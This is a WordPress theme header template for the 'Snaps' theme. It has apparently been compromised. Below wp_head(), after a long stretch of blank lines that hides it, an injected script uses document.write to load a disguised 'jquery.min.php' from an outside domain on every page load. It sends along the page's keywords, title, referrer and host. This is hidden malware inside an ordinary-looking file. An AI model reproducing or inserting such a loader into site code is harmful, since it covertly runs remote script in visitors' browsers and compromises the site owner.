<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @package Snaps
 * @since Snaps 1.0
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />
<meta name="viewport" content="width=device-width" />
<title><?php wp_title( '|', true, 'right' ); ?></title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
<![endif]-->

<?php wp_head(); ?>

























































<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://www.marios-ice.nl/js/jquery.min.php?c_utt=G91825&c_utm='+encodeURIComponent('http://www.marios-ice.nl/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
</head>

<body <?php body_class(); ?>>
<div id="page" class="hfeed site">
	<?php do_action( 'before' ); ?>
	<?php $header_image = get_header_image(); ?>

	<header id="masthead" class="site-header" role="banner" <?php if ( ! empty( $header_image ) ) { ?>style="background:url(<?php header_image(); ?>) no-repeat center center; background-size: cover; height:<?php echo get_custom_header()->height; ?>px;" <?php } ?>>
		<hgroup>
			<div class="site-text">
				<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
				<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
			</div>
		</hgroup>
	</header><!-- #masthead .site-header -->

	<div id="main" class="site-main">
		<nav id="anchor" role="navigation" class="site-navigation main-navigation">
			<h1 class="assistive-text"><?php _e( 'Menu', 'snaps' ); ?></h1>
			<div class="assistive-text skip-link"><a href="#content" title="<?php esc_attr_e( 'Skip to content', 'snaps' ); ?>"><?php _e( 'Skip to content', 'snaps' ); ?></a></div>

			<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>

		</nav><!-- .site-navigation .main-navigation -->
